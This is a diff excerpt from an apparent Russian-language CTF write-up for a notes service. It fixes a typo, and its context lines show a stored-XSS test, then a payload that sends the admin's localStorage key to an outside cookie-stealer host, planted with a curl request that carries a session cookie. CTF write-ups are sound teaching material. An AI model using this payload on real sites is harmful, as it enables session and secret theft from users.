@@ -7,7 +7,7 @@
 
 4. Тестируем на xss. Находим, что  выполняется скприпт, если передать незашифрованный text <script>alert("TEST");</script> в addnote.
 
-5. Делаем запрос к кукой админа что забрать его localStorage->key:
+5. Делаем запрос к кукой админа что бы забрать его localStorage->key:
 ```
 src="<script type="text/javascript">document.location='http://89.163.129.121:9999/cookiestealer.php?c='.concat(window.localStorage.getItem('key'));</script>"
 curl "http://vault.ctf2019.rocks/addnote.php?title=aaax&text=$src"  -H 'Cookie: session=MTYsMjEsMjgsMjQsMzE6OjoxMTM3'  -v
